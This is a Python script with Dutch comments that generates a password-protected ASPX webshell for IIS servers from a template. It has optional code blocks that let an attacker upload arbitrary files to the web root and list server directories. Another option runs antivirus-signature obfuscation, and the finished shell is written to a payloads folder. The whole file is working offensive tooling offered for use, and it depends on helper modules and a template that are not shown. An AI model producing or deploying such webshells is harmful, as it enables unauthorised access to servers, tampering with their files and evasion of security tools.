#!/usr/bin/python3

# ASPX Webshell generator
# Leest template, vervangt placeholders, schrijft naar http/payloads/shell.aspx

from meuk.hacksec import *

parser = argparse.ArgumentParser()
parser.add_argument("password", help="wachtwoord voor webshell authenticatie")
parser.add_argument("password_field", help="POST parameter naam voor wachtwoord", nargs="?", default="k")
parser.add_argument("--upload", action="store_true", help="upload functionaliteit toevoegen")
parser.add_argument("--filebrowser", action="store_true", help="file browser functionaliteit toevoegen")
parser.add_argument("--obfuscate", action="store_true", help="ASPX AV obfuscatie toepassen")
args = parser.parse_args()

print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Generating ASPX webshell with password field '{bcolors.OKGREEN}{args.password_field}{bcolors.OKBLUE}'{bcolors.ENDC}")

template = lezen("meuk/template/aspxshell.aspx")

shell = template.replace("[password]", args.password)
shell = shell.replace("[password_field]", args.password_field)

# Bouw features blok
features = []
if args.upload:
    features.append(
        'if(Request.Files.Count>0){'
        'HttpPostedFile f=Request.Files[0];'
        'string d=Request.Form["d"]??"C:\\\\inetpub\\\\wwwroot";'
        'f.SaveAs(Path.Combine(d,Path.GetFileName(f.FileName)));'
        'Response.Write("Upload OK: "+f.FileName);}'
    )
if args.filebrowser:
    features.append(
        'if(Request.Form["ls"]!=null){'
        'string d=Request.Form["ls"];'
        'Response.Write("<pre>");'
        'foreach(string e in Directory.GetFileSystemEntries(d))'
        '{Response.Write(Path.GetFileName(e)+"\\n");}'
        'Response.Write("</pre>");}'
    )

shell = shell.replace("[features]", "\n".join(features))

if args.obfuscate:
    from obfuscate_av import obfuscate_text
    shell, aspx_stats = obfuscate_text(shell, "aspx")
    print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] ASPX obfuscatie: {aspx_stats['string']} signatures aangepast{bcolors.ENDC}")

schrijven("http/payloads/shell.aspx", shell)
print(f"{bcolors.BOLD}{bcolors.OKGREEN}[+] Webshell geschreven naar: http/payloads/shell.aspx{bcolors.ENDC}")
